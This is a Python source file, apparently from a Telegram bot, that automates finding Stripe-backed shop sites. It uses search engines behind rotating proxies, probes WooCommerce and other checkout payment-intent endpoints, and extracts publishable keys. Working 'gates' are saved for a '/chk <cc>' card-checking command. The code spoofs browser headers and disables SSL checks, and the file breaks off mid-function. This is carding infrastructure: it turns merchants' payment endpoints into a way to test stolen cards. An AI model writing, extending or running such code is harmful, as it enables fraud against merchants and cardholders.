"""
handlers/scanner.py — Gate Scanner Commands (v6)

Commands:
  /gscan <url>      — Single site live scan with real-time Telegram logging
  /mgscan           — Mass scan from .txt file (with progress + proxy rotation)
  /autodiscover [n] — Multi-engine discovery (Google+Bing+Yahoo+DDG+Yandex)
  /autoscan [n]     — Full pipeline: discover → fast probe → deep scan
  /mygates          — Show all saved working gates
  /delgate <id>     — Delete a gate by ID
  /cleargates       — Remove all gates (owner only)

Smart features in ALL commands:
  - Live logging to Telegram during scan
  - WooCommerce cart flow (find product → add to cart → checkout → key)
  - GiveWP / Next.js / Generic site detection
  - Proxy rotation per request
  - 5-engine parallel discovery (Google+Bing+Yahoo+DDG+Yandex)
"""
import asyncio
import os
import time

from pyrogram import Client, filters, enums
from pyrogram.types import Message

import database.db as db
import config
from utils.error_handler import notify_owner_on_error



def _is_admin(user_id: int) -> bool:
    return user_id in config.OWNER_IDS


async def _admin_denied(msg):
    from pyrogram import enums
    await msg.reply(
        "🚫 **Access Denied!**\n\nThis bot is private — admin only.",
        parse_mode=enums.ParseMode.MARKDOWN
    )


# ── Site type icons ────────────────────────────────────────────────────────────
TYPE_ICONS = {
    "WOOCOMMERCE": "🛒",
    "GIVEWP":      "🎁",
    "NEXTJS":      "⚛️",
    "GENERIC":     "🌐",
    "UNKNOWN":     "❓",
}


def register_scanner(app: Client):

    # ── /gscan <url> — Single live scan ───────────────────────────────────────
    @app.on_message(filters.command("gscan"))
    @notify_owner_on_error
    async def gscan_cmd(client: Client, msg: Message):
        """Scan a single website with live Telegram logging. ADMIN ONLY."""
        if not _is_admin(msg.from_user.id):
            await _admin_denied(msg); return
        parts = msg.text.strip().split(maxsplit=1)
        if len(parts) < 2:
            await msg.reply(
                "❌ **Usage:** `/gscan https://example.com`\n\n"
                "🧠 **Bot will:**\n"
                "  • Detect site type (WooCommerce/GiveWP/Next.js)\n"
                "  • WooCommerce: find product → add to cart → checkout\n"
                "  • Extract pk_live_ key from checkout page\n"
                "  • Probe 25+ payment endpoints\n"
                "  • Show live progress in this message\n\n"
                "💡 Mass scan: `/mgscan` (send .txt file)\n"
                "💡 Auto-find sites: `/autoscan`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        url = parts[1].strip()
        if not url.startswith("http"):
            url = "https://" + url

        from core.proxy_manager import get_next_proxy
        proxy = get_next_proxy()
        proxy_info = f"🌐 `{proxy['host']}:{proxy['port']}`" if proxy else "🚫 No proxy (direct)"

        wait_msg = await msg.reply(
            f"🔍 **Starting Live Scan...**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 URL: `{url}`\n"
            f"Proxy: {proxy_info}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Detecting site type...",
            parse_mode=enums.ParseMode.MARKDOWN,
        )

        from gateways.stripe_scraper import scan_site
        try:
            result = await scan_site(url, proxy=proxy, tg_msg=wait_msg)
        except Exception as e:
            await wait_msg.edit_text(
                f"❌ **Scan Error**\n`{str(e)[:100]}`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        await _send_scan_result(wait_msg, result, msg.from_user.id)


    # ── /mgscan — Mass scan from .txt file ────────────────────────────────────
    @app.on_message(
        filters.command("mgscan") & (filters.document | filters.text)
    )
    @notify_owner_on_error
    async def mgscan_cmd(client: Client, msg: Message):
        """Mass scan URLs from a .txt file with proxy rotation and live progress."""
        doc_msg = None
        if msg.document:
            doc_msg = msg
        elif msg.reply_to_message and msg.reply_to_message.document:
            doc_msg = msg.reply_to_message
        else:
            await msg.reply(
                "❌ **How to use /mgscan:**\n\n"
                "**Method 1:** Send `.txt` file with caption `/mgscan`\n"
                "**Method 2:** Reply to a `.txt` file with `/mgscan`\n\n"
                "📄 File format (one URL per line):\n"
                "```\nhttps://example.com\nhttps://shop.example.org\n```\n\n"
                "🧠 **Smart features:**\n"
                "  • WooCommerce cart flow per site\n"
                "  • Live progress updates\n"
                "  • Proxy rotation per site\n"
                "  • Max 100 URLs per batch",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        doc = doc_msg.document
        if not (doc.file_name or "").lower().endswith(".txt"):
            await msg.reply("❌ Only `.txt` files supported.", parse_mode=enums.ParseMode.MARKDOWN)
            return

        if doc.file_size > 1_000_000:
            await msg.reply("❌ File too large. Max **1MB**.", parse_mode=enums.ParseMode.MARKDOWN)
            return

        wait_msg = await msg.reply("📥 **Downloading file...**", parse_mode=enums.ParseMode.MARKDOWN)

        tmp_path = None
        try:
            tmp_path = await client.download_media(doc)
            with open(tmp_path, "r", encoding="utf-8", errors="ignore") as f:
                content = f.read()
        except Exception as e:
            await wait_msg.edit_text(f"❌ Failed to read file: `{e}`", parse_mode=enums.ParseMode.MARKDOWN)
            return
        finally:
            if tmp_path and os.path.exists(tmp_path):
                os.remove(tmp_path)

        # Parse URLs
        urls = []
        for line in content.splitlines():
            line = line.strip()
            if line and not line.startswith("#"):
                if not line.startswith("http"):
                    line = "https://" + line
                urls.append(line)

        if not urls:
            await wait_msg.edit_text("❌ No valid URLs found in file.", parse_mode=enums.ParseMode.MARKDOWN)
            return

        total = len(urls)
        if total > 500:
            await wait_msg.edit_text(
                f"❌ Too many URLs (`{total}`). Max **500** per batch.",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        from core.proxy_manager import get_next_proxy
        from gateways.stripe_scraper import scan_site

        await wait_msg.edit_text(
            f"⚡ **Mass Scan Started!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 **URLs:** `{total}`\n"
            f"🧠 **Mode:** WooCommerce cart flow + endpoint probe\n"
            f"🔄 **Concurrency:** 3 parallel\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Scanning...",
            parse_mode=enums.ParseMode.MARKDOWN,
        )

        done        = 0
        found_gates = 0
        found_keys  = 0
        failed      = 0
        working_gates: list[dict] = []
        current_site  = ["—"]
        sem    = asyncio.Semaphore(3)
        start  = time.monotonic()
        EVERY  = 3

        async def scan_one(url: str):
            nonlocal done, found_gates, found_keys, failed
            async with sem:
                proxy = get_next_proxy()
                current_site[0] = url.replace("https://", "").replace("http://", "")[:35]

                try:
                    r = await scan_site(url, proxy=proxy)  # No tg_msg in mass mode
                    done += 1

                    if r.pk_live_keys:
                        found_keys += 1

                    if r.is_working and r.working_endpoint:
                        found_gates += 1
                        ep = r.working_endpoint
                        gate_id = await db.add_gate(
                            domain=r.domain,
                            pk_key=ep.get("pk_key", ""),
                            endpoint=ep["endpoint"],
                            method=ep.get("method", "POST"),
                            intent_type=ep.get("intent_type", "payment_intent"),
                            added_by=msg.from_user.id,
                        )
                        t_icon = TYPE_ICONS.get((r.site_type or "").upper(), "🌐")
                        working_gates.append({
                            "id":        gate_id,
                            "domain":    r.domain,
                            "endpoint":  ep["endpoint"],
                            "type":      r.site_type,
                            "t_icon":    t_icon,
                        })
                    else:
                        failed += 1

                except Exception as e:
                    done  += 1
                    failed += 1

                # Progress update every EVERY scans
                if done % EVERY == 0 or done == total:
                    elapsed = time.monotonic() - start
                    pct = int(done / total * 100)
                    gate_lines = ""
                    for g in working_gates[-3:]:
                        gate_lines += f"\n  {g['t_icon']} `{g['domain']}` → `{g['endpoint'][:30]}`"

                    try:
                        await wait_msg.edit_text(
                            f"⚡ **Mass Scan: `{done}/{total}` ({pct}%)**\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"🔍 Now: `{current_site[0]}`\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"✅ Gates: `{found_gates}` | 🔑 Keys: `{found_keys}` | ❌ Failed: `{failed}`\n"
                            f"⏱️ `{elapsed:.1f}s`"
                            + (f"\n━━━━━━━━━━━━━━━━━━━━━━\n**Latest Gates:**{gate_lines}" if gate_lines else ""),
                            parse_mode=enums.ParseMode.MARKDOWN,
                        )
                    except Exception:
                        pass

        await asyncio.gather(*[scan_one(u) for u in urls])
        elapsed = time.monotonic() - start

        if working_gates:
            gates_text = "\n".join(
                f"{g['t_icon']} `#{g['id']}` **{g['domain']}**\n"
                f"   `{g['endpoint']}`"
                for g in working_gates[:10]
            )
            if len(working_gates) > 10:
                gates_text += f"\n_...+{len(working_gates)-10} more_"
        else:
            gates_text = "_No working gates found_"

        await wait_msg.edit_text(
            f"🏁 **Mass Scan Complete!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Scanned: `{total}` | ✅ Gates: `{found_gates}` | ❌ Failed: `{failed}`\n"
            f"⏱️ Total: `{elapsed:.1f}s` | Avg: `{elapsed/max(total,1):.1f}s/site`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"**Working Gates:**\n{gates_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 `/mygates` | `/chk <cc>` to use!",
            parse_mode=enums.ParseMode.MARKDOWN,
        )


    # ── /autodiscover [count] — 5-engine parallel discovery ──────────────────
    @app.on_message(filters.command("autodiscover"))
    @notify_owner_on_error
    async def autodiscover_cmd(client: Client, msg: Message):
        """Discover Stripe sites using 5 search engines in parallel."""
        parts = msg.text.strip().split()
        count = 30
        if len(parts) > 1:
            try:
                count = min(int(parts[1]), 1000)  # Up to 1000 sites
            except ValueError:
                pass

        from core.proxy_manager import get_next_proxy
        proxy = get_next_proxy()

        if not proxy:
            await msg.reply(
                "⚠️ **No Proxy Found!**\n\n"
                "Search engines block cloud server IPs.\n"
                "Add proxy first:\n"
                "`/addproxy user:pass@host:port`\n\n"
                "Without proxy, only seed sites available.",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        proxy_display = f"`{proxy['host']}:{proxy['port']}`"
        wait_msg = await msg.reply(
            f"🔭 **Multi-Engine Discovery Starting...**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🎯 Target: `{count}` sites\n"
            f"🌐 Proxy: {proxy_display}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔍 Engines (all parallel):\n"
            f"  🟢 Google — best results\n"
            f"  🟡 Bing — good for stores\n"
            f"  🟠 Yahoo — extra coverage\n"
            f"  🔵 DuckDuckGo — anonymous\n"
            f"  🔴 Yandex — finds more sites\n"
            f"  📂 WordPress.org — forum mining\n"
            f"  📋 US Seed Sites — always ready\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Running... (~2-3 min)",
            parse_mode=enums.ParseMode.MARKDOWN,
        )

        from core.auto_discover import discover_stripe_sites

        found_count = [0]

        async def progress_cb(n, total_target):
            found_count[0] = n
            try:
                pct = min(int(n / max(total_target, 1) * 100), 99)
                await wait_msg.edit_text(
                    f"🔭 **Discovering...**\n"
                    f"━━━━━━━━━━━━━━━━━━━━━━\n"
                    f"🔍 Found: `{n}` sites so far\n"
                    f"🎯 Target: `{total_target}` | Progress: `{pct}%`\n"
                    f"⏳ Engines running in parallel...",
                    parse_mode=enums.ParseMode.MARKDOWN,
                )
            except Exception:
                pass

        try:
            urls = await discover_stripe_sites(count=count, proxy=proxy, progress_cb=progress_cb)
        except Exception as e:
            await wait_msg.edit_text(
                f"❌ Discovery failed: `{str(e)[:100]}`\n"
                f"💡 Check proxy: `/testproxy`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        if not urls:
            await wait_msg.edit_text(
                "❌ **No Sites Found!**\n\n"
                "Proxy might be blocked. Possible fixes:\n"
                "• Try different proxy: `/addproxy ...`\n"
                "• Use `/gscan <url>` to scan manually",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        url_preview = "\n".join(f"  • `{u.replace('https://','').replace('http://','')}`" for u in urls[:10])
        if len(urls) > 10:
            url_preview += f"\n  _...+{len(urls)-10} more_"

        await wait_msg.edit_text(
            f"✅ **Found {len(urls)} Sites!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{url_preview}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 Sources: Google+Bing+Yahoo+DDG+Yandex+WP.org+Seeds\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 Now scan for gates:\n"
            f"`/autoscan {count}`",
            parse_mode=enums.ParseMode.MARKDOWN,
        )


    # ── /autoscan [count] — Full pipeline ────────────────────────────────────
    @app.on_message(filters.command("autoscan"))
    @notify_owner_on_error
    async def autoscan_cmd(client: Client, msg: Message):
        """Full pipeline: multi-engine discovery → fast probe → intelligent deep scan."""
        parts = msg.text.strip().split()
        count = 30
        if len(parts) > 1:
            try:
                count = min(int(parts[1]), 1000)  # Up to 1000 sites
            except ValueError:
                pass

        from core.proxy_manager import get_next_proxy
        proxy = get_next_proxy()

        if not proxy:
            await msg.reply(
                "⚠️ **No Proxy Found!**\n\n"
                "Add residential proxy:\n"
                "`/addproxy user:pass@host:port`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        proxy_display = f"`{proxy['host']}:{proxy['port']}`"
        wait_msg = await msg.reply(
            f"🚀 **Auto-Scan Pipeline**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Proxy: {proxy_display}\n"
            f"🎯 Target: `{count}` sites\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"**Phase 1:** 5-engine discovery\n"
            f"  Google + Bing + Yahoo + DDG + Yandex\n"
            f"**Phase 2:** Fast WC endpoint probe\n"
            f"**Phase 3:** Intelligent deep scan\n"
            f"  WooCommerce cart → checkout → key\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Starting (~3-5 min)...",
            parse_mode=enums.ParseMode.MARKDOWN,
        )

        from core.auto_discover import discover_stripe_sites, fast_woocommerce_scan
        from gateways.stripe_scraper import scan_site

        # ── Phase 1: Discovery ─────────────────────────────────────────────
        disc_found = [0]

        async def disc_progress(n, target):
            disc_found[0] = n
            try:
                await wait_msg.edit_text(
                    f"🔭 **Phase 1: Discovering...**\n"
                    f"🔍 Found: `{n}` sites\n"
                    f"🎯 Target: `{target}`\n"
                    f"Engines: Google+Bing+Yahoo+DDG+Yandex",
                    parse_mode=enums.ParseMode.MARKDOWN,
                )
            except Exception:
                pass

        try:
            urls = await discover_stripe_sites(count=count, proxy=proxy, progress_cb=disc_progress)
        except Exception as e:
            await wait_msg.edit_text(
                f"❌ Discovery failed: `{str(e)[:100]}`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        if not urls:
            await wait_msg.edit_text(
                "❌ No sites discovered!\n"
                "💡 Check proxy with `/testproxy`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        total = len(urls)
        await wait_msg.edit_text(
            f"⚡ **Phase 2: Fast WC Probe**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📡 Sites discovered: `{total}`\n"
            f"🔍 Probing: `/?wc-ajax=stripe_create_payment_intent`\n"
            f"_(no cart needed — fastest path)_",
            parse_mode=enums.ParseMode.MARKDOWN,
        )

        # ── Phase 2: Fast WC probe ─────────────────────────────────────────
        wc_done_count = [0]

        async def wc_cb(done, tot, found):
            wc_done_count[0] = done
            try:
                pct = int(done / tot * 100)
                await wait_msg.edit_text(
                    f"⚡ **Phase 2: Fast WC Probe `{done}/{tot}` ({pct}%)**\n"
                    f"✅ WC endpoints working: `{found}`\n"
                    f"🔍 Checking direct Stripe endpoints...",
                    parse_mode=enums.ParseMode.MARKDOWN,
                )
            except Exception:
                pass

        fast_results = await fast_woocommerce_scan(
            domains=urls, proxy=proxy, progress_cb=wc_cb,
        )

        # ── Phase 3: Deep scan remaining ──────────────────────────────────
        working_gates: list[dict] = []
        done_count  = 0
        found_gates = 0
        failed      = 0
        current     = ["—"]
        start       = time.monotonic()
        EVERY       = 3

        # First — process sites that fast probe confirmed (just need pk key)
        fast_domains = {f["base_url"] for f in fast_results}

        await wait_msg.edit_text(
            f"🧠 **Phase 3: Deep Scan**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ Fast WC hits: `{len(fast_results)}`\n"
            f"🔍 Deep scanning: `{total - len(fast_results)}` remaining sites\n"
            f"🛒 WooCommerce cart flow active\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏳ Please wait...",
            parse_mode=enums.ParseMode.MARKDOWN,
        )

        sem = asyncio.Semaphore(3)

        async def deep_scan_one(url: str, fast_ep: dict = None):
            nonlocal done_count, found_gates, failed
            async with sem:
                p = get_next_proxy() or proxy
                domain_short = url.replace("https://", "").replace("http://", "")[:30]
                current[0] = domain_short

                try:
                    r = await scan_site(url, proxy=p)
                    done_count += 1

                    if r.is_working and r.working_endpoint:
                        found_gates += 1
                        ep = r.working_endpoint
                        gate_id = await db.add_gate(
                            domain=r.domain,
                            pk_key=ep.get("pk_key", ""),
                            endpoint=ep["endpoint"],
                            method=ep.get("method", "POST"),
                            intent_type=ep.get("intent_type", "payment_intent"),
                            added_by=msg.from_user.id,
                        )
                        t_icon = TYPE_ICONS.get((r.site_type or "").upper(), "🌐")
                        working_gates.append({
                            "id": gate_id,
                            "domain": r.domain,
                            "endpoint": ep["endpoint"],
                            "t_icon": t_icon,
                            "type": r.site_type,
                        })

                    elif fast_ep and r.pk_live_keys:
                        # Fast probe confirmed endpoint, full scan got the key
                        found_gates += 1
                        gate_id = await db.add_gate(
                            domain=r.domain,
                            pk_key=r.pk_live_keys[0],
                            endpoint=fast_ep["endpoint"],
                            method="POST",
                            intent_type=fast_ep.get("intent_type", "payment_intent"),
                            added_by=msg.from_user.id,
                        )
                        t_icon = TYPE_ICONS.get((r.site_type or "").upper(), "🌐")
                        working_gates.append({
                            "id": gate_id,
                            "domain": r.domain,
                            "endpoint": fast_ep["endpoint"],
                            "t_icon": t_icon,
                            "type": r.site_type,
                        })
                    else:
                        failed += 1

                except Exception:
                    done_count += 1
                    failed += 1

                if done_count % EVERY == 0 or done_count == total:
                    elapsed = time.monotonic() - start
                    pct = int(done_count / total * 100)
                    recent_gates = "".join(
                        f"\n  {g['t_icon']} `{g['domain']}` → `{g['endpoint'][:28]}`"
                        for g in working_gates[-3:]
                    )
                    try:
                        await wait_msg.edit_text(
                            f"🧠 **Deep Scan: `{done_count}/{total}` ({pct}%)**\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"🔍 Scanning: `{current[0]}`\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"✅ Gates: `{found_gates}` | ❌ Failed: `{failed}`\n"
                            f"⏱️ `{elapsed:.1f}s`"
                            + (f"\n**Recent Gates:**{recent_gates}" if recent_gates else ""),
                            parse_mode=enums.ParseMode.MARKDOWN,
                        )
                    except Exception:
                        pass

        # Build task list: fast-confirmed sites first, then remaining
        tasks = []
        for f in fast_results:
            tasks.append(deep_scan_one(f["base_url"], fast_ep=f))
        for u in urls:
            if u not in fast_domains:
                tasks.append(deep_scan_one(u))

        await asyncio.gather(*tasks)
        elapsed = time.monotonic() - start

        # Final result
        if working_gates:
            gates_text = "\n".join(
                f"{g['t_icon']} `#{g['id']}` **{g['domain']}**\n"
                f"   `{g['endpoint']}`"
                for g in working_gates[:10]
            )
            if len(working_gates) > 10:
                gates_text += f"\n_...+{len(working_gates)-10} more_"
        else:
            gates_text = "_No working gates found_"

        await wait_msg.edit_text(
            f"🏁 **Auto-Scan Complete!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Discovered: `{total}` | ⚡ Fast WC: `{len(fast_results)}`\n"
            f"✅ Working Gates: `{found_gates}` | ❌ Failed: `{failed}`\n"
            f"⏱️ Total: `{elapsed:.1f}s`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"**Gates Found:**\n{gates_text}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 `/mygates` | `/chk <cc>` to use!",
            parse_mode=enums.ParseMode.MARKDOWN,
        )


    # ── /mygates — View saved gates ───────────────────────────────────────────
    @app.on_message(filters.command("mygates"))
    @notify_owner_on_error
    async def mygates_cmd(client: Client, msg: Message):
        """Show all saved working gates."""
        gates = await db.get_active_gates()

        if not gates:
            await msg.reply(
                "❌ **No gates saved yet!**\n\n"
                "Scan websites:\n"
                "  `/gscan https://example.com` — single site\n"
                "  `/mgscan` — mass scan from .txt\n"
                "  `/autoscan` — auto find + scan",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        lines = [
            f"⚡ **Saved Gates — {len(gates)} Total**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
        ]

        for g in gates[:20]:
            intent_icon = "💳" if g["intent_type"] == "payment_intent" else "🔐"
            pk_short    = g["pk_key"][:20] + "..."
            total_use   = g["success_count"] + g["fail_count"]
            rate_str    = f" | ✅{int(g['success_count']/total_use*100)}%" if total_use > 0 else ""
            lines.append(
                f"**#{g['id']}** {intent_icon} `{g['domain']}`\n"
                f"   🔗 `{g['endpoint']}`\n"
                f"   🔑 `{pk_short}`{rate_str}\n"
            )

        if len(gates) > 20:
            lines.append(f"_...and {len(gates)-20} more_\n")

        lines.append(
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🗑️ `/delgate <id>` | 🧹 `/cleargates` (owner)"
        )
        await msg.reply("\n".join(lines), parse_mode=enums.ParseMode.MARKDOWN)


    # ── /delgate <id> ─────────────────────────────────────────────────────────
    @app.on_message(filters.command("delgate"))
    @notify_owner_on_error
    async def delgate_cmd(client: Client, msg: Message):
        """Delete a gate by ID."""
        parts = msg.text.strip().split()
        if len(parts) < 2 or not parts[1].isdigit():
            await msg.reply(
                "❌ Usage: `/delgate <id>`\n\nGet IDs from `/mygates`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        gate_id = int(parts[1])
        await db.disable_gate(gate_id)
        await msg.reply(f"✅ Gate `#{gate_id}` removed!", parse_mode=enums.ParseMode.MARKDOWN)


    # ── /cleargates — Owner only ───────────────────────────────────────────────
    @app.on_message(filters.command("cleargates"))
    @notify_owner_on_error
    async def cleargates_cmd(client: Client, msg: Message):
        """Remove all saved gates (owner only)."""
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("❌ Owner only command!", parse_mode=enums.ParseMode.MARKDOWN)
            return
        count = await db.get_all_gates_count()
        await db.clear_all_gates()
        await msg.reply(
            f"✅ Cleared `{count}` gates from database!",
            parse_mode=enums.ParseMode.MARKDOWN,
        )

    # ── /addgate — Manually add a gate (owner only) ────────────────────────────
    @app.on_message(filters.command("addgate"))
    @notify_owner_on_error
    async def addgate_cmd(client: Client, msg: Message):
        """
        Manually add a Stripe gate from PK key + endpoint.
        Owner only.

        Usage:
          /addgate pk_live_xxx|https://site.com/api/create-intent
          /addgate pk_live_xxx|https://site.com/?wc-ajax=stripe_create_payment_intent|setup_intent

        Format: pk_key|endpoint_url|[intent_type=payment_intent]
        intent_type: payment_intent (default) or setup_intent
        """
        if msg.from_user.id not in config.OWNER_IDS:
            await msg.reply("❌ Owner only command!", parse_mode=enums.ParseMode.MARKDOWN)
            return

        text = msg.text.strip()
        args = text[len("/addgate"):].strip()

        if not args:
            await msg.reply(
                "❌ **Usage:**\n"
                "`/addgate pk_live_xxx|https://site.com/api/create-intent`\n"
                "`/addgate pk_live_xxx|https://site.com/endpoint|setup_intent`\n\n"
                "**Format:** `pk_key|endpoint_url|[intent_type]`\n"
                "**intent_type:** `payment_intent` (default) or `setup_intent`\n\n"
                "**Example:**\n"
                "`/addgate pk_live_h5ocN...|https://example.com/?wc-ajax=stripe_create_payment_intent`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        parts = [p.strip() for p in args.split("|")]
        if len(parts) < 2:
            await msg.reply(
                "❌ **Format galat hai!**\n"
                "`/addgate pk_live_xxx|https://site.com/endpoint`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        pk_key      = parts[0]
        endpoint    = parts[1]
        intent_type = parts[2] if len(parts) > 2 else "payment_intent"

        if not pk_key.startswith("pk_live_"):
            await msg.reply(
                "❌ **Invalid PK key!**\nMust start with `pk_live_`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        if not endpoint.startswith("http"):
            await msg.reply(
                "❌ **Invalid endpoint!**\nMust start with `https://` or `http://`",
                parse_mode=enums.ParseMode.MARKDOWN,
            )
            return

        if intent_type not in ("payment_intent", "setup_intent"):
            intent_type = "payment_intent"

        # Extract domain from endpoint URL
        from urllib.parse import urlparse
        parsed = urlparse(endpoint)
        domain = parsed.netloc or parsed.path.split("/")[0]

        wait_msg = await msg.reply(
            f"⏳ **Testing gate...**\n`{domain}`",
            parse_mode=enums.ParseMode.MARKDOWN,
        )

        # Quick test: try to hit the endpoint and see if client_secret comes back
        import aiohttp
        test_result = "untested"
        secret_found = False
        try:
            async with aiohttp.ClientSession() as session:
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Origin": f"https://{domain}",
                    "Referer": f"https://{domain}/",
                }
                payload = {"amount": 100, "currency": "usd"}
                async with session.post(
                    endpoint, json=payload, headers=headers,
                    timeout=aiohttp.ClientTimeout(total=10), ssl=False,
                ) as r:
                    raw = await r.text()
                    if "client_secret" in raw or "clientSecret" in raw:
                        test_result = "working"
                        secret_found = True
                    elif "pk_live" in raw:
                        test_result = "key_only"
                    else:
                        test_result = f"http_{r.status}"
        except Exception as e:
            test_result = f"error: {str(e)[:40]}"

        # Save gate to DB regardless (user knows it works)
        gate_id = await db.add_gate(
            domain=domain,
            pk_key=pk_key,
            endpoint=endpoint,
            method="POST",
            intent_type=intent_type,
            added_by=msg.from_user.id,
        )

        i_icon  = "💳" if intent_type == "payment_intent" else "🔐"
        i_label = "PaymentIntent" if intent_type == "payment_intent" else "SetupIntent"
        status_line = "✅ Endpoint is LIVE (client_secret returned)" if secret_found else f"⚠️ Endpoint test: `{test_result}` (saved anyway)"

        await wait_msg.edit_text(
            f"✅ **Gate Added Successfully!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🆔 **Gate ID:** `#{gate_id}`\n"
            f"🌐 **Domain:** `{domain}`\n"
            f"🔑 **PK Key:** `{pk_key[:40]}...`\n"
            f"🔗 **Endpoint:** `{endpoint[:60]}`\n"
            f"{i_icon} **Intent:** `{i_label}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{status_line}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 `/chk <cc>` — card check karega is gate se\n"
            f"💡 `/mygates` — all gates dekhne ke liye",
            parse_mode=enums.ParseMode.MARKDOWN,
        )




# ── _send_scan_result ─────────────────────────────────────────────────────────
async def _send_scan_result(msg, result, user_id: int):
    """Format and display single /gscan result with full details."""
    domain    = result.domain or "unknown"
    scan_time = f"{result.scan_time:.1f}s"
    pages     = len(result.pages_scanned)
    site_type = (result.site_type or "unknown").upper()
    method    = result.method_used or "—"
    t_icon    = TYPE_ICONS.get(site_type, "🌐")
    stats     = f"📊 `{site_type}` | Pages:`{pages}` | JS:`{result.js_files_scanned}` | ⏱️`{scan_time}`"

    # ── Failed completely ────────────────────────────────────────────────────
    if result.error and not result.pk_live_keys and not result.pk_test_keys:
        await msg.edit_text(
            f"❌ **Scan Failed**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 **Domain:** `{domain}`\n"
            f"{t_icon} **Type:** `{site_type}`\n"
            f"❓ **Reason:** `{result.error[:160]}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{stats}",
            parse_mode=enums.ParseMode.MARKDOWN,
        )
        return

    # ── No keys ──────────────────────────────────────────────────────────────
    if not result.pk_live_keys and not result.pk_test_keys:
        await msg.edit_text(
            f"⚠️ **No Stripe Keys Found**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 **Domain:** `{domain}`\n"
            f"{t_icon} **Type:** `{site_type}`\n"
            f"❌ No `pk_live_` key found (site may use server-side Stripe)\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{stats}",
            parse_mode=enums.ParseMode.MARKDOWN,
        )
        return

    live_key_text = "".join(f"  • `{k[:36]}...`\n" for k in result.pk_live_keys[:3])
    test_key_text = "".join(f"  • `{k[:36]}...` _(test)_\n" for k in result.pk_test_keys[:2])

    # ── Working gate found ────────────────────────────────────────────────────
    if result.is_working and result.working_endpoint:
        ep          = result.working_endpoint
        intent_type = ep.get("intent_type", "payment_intent")
        endpoint    = ep.get("endpoint", "?")
        pk_key      = ep.get("pk_key", "")

        gate_id = await db.add_gate(
            domain=domain,
            pk_key=pk_key,
            endpoint=endpoint,
            method=ep.get("method", "POST"),
            intent_type=intent_type,
            added_by=user_id,
        )

        i_icon  = "💳" if intent_type == "payment_intent" else "🔐"
        i_label = "PaymentIntent" if intent_type == "payment_intent" else "SetupIntent"

        text = (
            f"✅ **WORKING GATE FOUND!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 **Domain:** `{domain}`\n"
            f"🆔 **Gate ID:** `#{gate_id}` _(saved to cloud DB)_\n"
            f"{t_icon} **Site Type:** `{site_type}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🔑 **PK Key:** `{pk_key[:42]}...`\n"
            f"🔗 **Endpoint:** `{endpoint}`\n"
            f"{i_icon} **Intent:** `{i_label}`\n"
            f"🧠 **Method:** `{method}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"{stats}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"💡 `/chk <cc>` to check cards | `/mygates` for all gates"
        )
        if len(result.pk_live_keys) > 1:
